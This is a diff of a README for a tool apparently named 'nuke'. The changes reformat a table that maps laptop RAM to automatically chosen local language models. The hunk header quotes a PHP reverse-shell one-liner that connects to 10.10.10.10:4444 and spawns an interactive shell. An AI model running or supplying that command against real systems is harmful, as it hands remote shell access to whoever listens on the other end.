@@ -57,13 +57,20 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 nuke
 ```
+<br>
 
-<b> Laptop RAM | Auto-selected model | Approx.RAM usage| Speed | <b>
-|-------------------------------------|--------------------------------|
-| 4–5 GB,      | phi3:mini,                   |~3 GB,Fast |
-| 6–9 GB,      | qwen2.5:7b-instruct-q5_K_M,  | ~6 GB,    | Very fast |
-| 10–13 GB,    | qwen2.5:14b-instruct-q5_K_M, | ~10 GB,   | Fast |
-| 14+ GB,      | qwen2.5:32b-instruct-q5_K_M, | ~18 GB,   | God mode | 
+<b> Smart Model Auto-Selection (based on your laptop RAM) <b>
+
+| Laptop RAM   | Auto-selected Model                  | Approx. RAM Usage | Speed       |
+|--------------|--------------------------------------|-------------------|-------------|
+| 4–5 GB       | `phi3:mini`                          | ~3 GB             | Fast        |
+| 6–9 GB       | `qwen2.5:7b-instruct-q5_K_M`         | ~6 GB             | Very fast   |
+| 10–13 GB     | `qwen2.5:14b-instruct-q5_K_M`        | ~10 GB            | Fast        |
+| 14+ GB       | `qwen2.5:32b-instruct-q5_K_M`        | ~18 GB            | God mode    |
+
+→ **Zero thinking required.**  
+Just run the installer — nuke automatically picks the **fastest possible model** that won’t crash your machine.
+<br>
 
 <b> Now you are good to go ALL RADY..! </b>
 <br> <br>
